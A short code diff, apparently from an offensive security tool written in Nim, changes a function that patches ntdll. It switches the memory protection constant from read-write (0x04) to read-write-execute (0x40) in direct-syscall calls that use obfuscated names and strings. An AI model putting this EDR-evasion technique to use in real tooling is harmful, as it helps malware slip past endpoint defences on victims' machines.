@@ -329,7 +329,7 @@ proc Patchntdll(): bool =
         success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
             
     when defined(SysWhispers):
-        status = uashdiasdj(pHandle, addr protectAddress,addr friendlycodeLength,0x04,addr t)
+        status = uashdiasdj(pHandle, addr protectAddress,addr friendlycodeLength,0x40,addr t)
                 
         if not NT_SUCCESS(status):
             echo obf("[-] Failed to change memory protections.")
@@ -361,7 +361,7 @@ proc Patchntdll(): bool =
                 syscall = ntProtectTable.wSysCall
             else:
                 echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
-        success = NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,0x04,addr t) 
+        success = NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,0x40,addr t) 
         if (success != 0):
             echo obf("NtProtectVirtualMemory failed")
             return disabled
